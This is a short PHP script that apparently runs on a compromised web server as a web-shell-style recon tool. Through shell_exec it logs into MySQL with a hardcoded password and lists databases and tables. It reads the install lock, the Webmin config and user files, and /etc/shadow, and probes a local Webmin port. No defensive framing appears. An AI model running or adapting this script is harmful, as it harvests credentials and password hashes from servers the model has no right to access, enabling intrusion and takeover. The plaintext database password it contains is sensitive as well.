<?php
// F056 MySQL CLI + Webmin + install.lock
header('Content-Type: text/plain; charset=utf-8');

echo "=== MYSQL CLI ===\n";
echo shell_exec('which mysql mariadb 2>&1') . "\n";
echo shell_exec('mysql -u adminer -p"cgts2026!" -e "SHOW DATABASES;" 2>&1') . "\n";
echo shell_exec('mysql -u adminer -p"cgts2026!" vec_cgts -e "SHOW TABLES;" 2>&1') . "\n";

echo "\n=== INSTALL LOCK ===\n";
echo shell_exec('cat /var/www/vec.cgts/install.lock 2>&1') . "\n";

echo "\n=== WEBMIN CONF ===\n";
echo shell_exec('cat /etc/webmin/miniserv.conf 2>&1 | grep -E "port|ssl|login|passwd|root" | head -20') . "\n";

echo "\n=== WEBMIN USERS ===\n";
echo shell_exec('cat /etc/webmin/miniserv.users 2>&1') . "\n";

echo "\n=== ROOT PASSWD HASH ===\n";
// Try reading shadow
echo shell_exec('cat /etc/shadow 2>&1 | head -5') . "\n";

echo "\n=== WEBMIN PORT TEST ===\n";
echo shell_exec('curl -sk --max-time 3 https://127.0.0.1:12321/ 2>&1 | head -20') . "\n";

echo "\n=== END ===\n";
?>
